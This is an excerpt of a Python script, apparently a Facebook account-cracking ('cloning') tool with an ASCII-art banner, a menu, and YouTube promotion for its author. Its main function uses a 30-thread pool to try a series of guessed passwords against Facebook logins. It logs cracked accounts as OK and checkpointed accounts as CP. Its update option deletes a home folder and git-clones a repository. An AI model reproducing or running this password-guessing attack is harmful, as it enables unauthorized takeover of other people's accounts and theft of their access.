...
br.addheaders = [('user-agent: Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5')]
...
logo='''
\033[1;94m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
\033[1;94m ┈┈┈▕▕M S  S▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕SWATI▏▏┈┈┈
\033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;94mMUMTAZ\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
\033[1;96m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
\033[1;96m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
\033[1;96m................\033[1;93mMUMTAZ\033[1;91m...............
\033[1;96m................\033[1;93m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............

\033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

\033[1;91m☞ Auther     : MUMTAZ SHAH 
\033[1;92m☞ WhatsApp   : MAIN NAHI BATAWNGA
\033[1;95m☞ YouTube    : https://www.youtube.com/@user-xg9yp9pr9j
...
def login():
	...
	try:
		...
		if 'access_token' in z:
		    ...
		    os.system('xdg-open https://www.youtube.com/@user-xg9yp9pr9j')
		    menu()
		else:
...
def menu():
	...
	print (S + '[' + P + '☞2' + S + ']' + S + ' Update Mumtaz Shah Tool')
	print (S + '[' + P + '☞3' + S + ']' + S + ' Stop Kidhar Ja Rahain')
...
def mb():
	...
	if bm =='':
	    ...
	    os.system('rm -rf $HOME/Mumtaz Shah')
	    os.system('cd $HOME && git clone https://github.com/AB-KH4N/MSS-SWATI.git')
	    cb()
	    print (logo)
	    psb('☆10%')
	    psb('☆☆20%')
	    ...
	    psb('WhatsApp Num MAIN NAHI BATAWNGA✓')
	    psb('WellCome To Mumtaz Shah')
	    psb('Congratulations Mumtaz_Shah Tool Has Been Updated Successfully')
	    psb('🔓User Name☆ MUMTAZ✓')
	    psb('🔓Password ☆ SHAH✓')
	    psb('Subscrib My Youtube Channel https://www.youtube.com/@user-xg9yp9pr9j✓')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $HOME/Mumtaz Shah')
	elif bm =='3':
	    os.system('xdg-open MAIN NAHI BATAWNGA')
	    menu()
	elif bm =='4':
	...
	def main(arg):
		...
		try:
			...
			if 'www.facebook.com' in k['error_msg']:
			    print(MSS+'[CP] ♡ '+user+' ♡ '+ps1)
			    cps.append(user+ps1)
			else:
			    if 'access_token' in k:
			        print (SWATI+'[OK] ♡ '+user+' ♡ '+ps1)
			        oks.append(user+ps1)
			    else:
			        ...
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(MSS+'[CP] ♡ '+user+' ♡ '+ps2)
			            cps.append(user+ps2)
			        else:
			            if 'access_token' in k:
			                print(SWATI+'[OK] ♡ '+user+' ♡ '+ps2)
			                oks.append(user+ps2)
			            else:
			                ...
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(MSS+'[CP] ♡ '+user+' ♡ '+ps3)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_token' in k:
			                        print(SWATI+'[OK] ♡ '+user+' ♡ '+ps3)
			                        oks.append(user+ps3)
			                    else:
			                        ...
			                        k=json.load(dt)
			                        if 'www.facebook.com' in k['error_msg']:
			                            print(MSS+'[CP] ♡ '+user+' ♡ '+ps4)
			                            cps.append(user+ps4)
			                        else:
			                            if 'access_token' in k:
			                                print(SWATI+'[OK] ♡ '+user+' ♡ '+ps4)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=('Pakistan')
			                                ...
			                                k=json.load(dt)
			                                if 'www.facebook.com' in k['error_msg']:
			                                    print(MSS+'[CP] ♡ '+user+' ♡ '+ps5)
			                                    cps.append(user+ps5)
			                                else:
			                                    if 'access_token' in k:
			                                        print(SWATI+'[OK] ♡ '+user+' ♡ '+ps5)
			                                        oks.append(user+ps5)
			                                    else:
			                                        ...
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(MSS+'[CP] ♡ '+user+' ♡ '+ps6)
			                                            cps.append(user+ps6)
			                                        else:
			                                            if 'access_token' in k:
			                                                print(SWATI+'[OK] ♡ '+user+' ♡ '+ps6)
			                                                oks.append(user+ps6)
		except:
			pass
	p=ThreadPool(30)
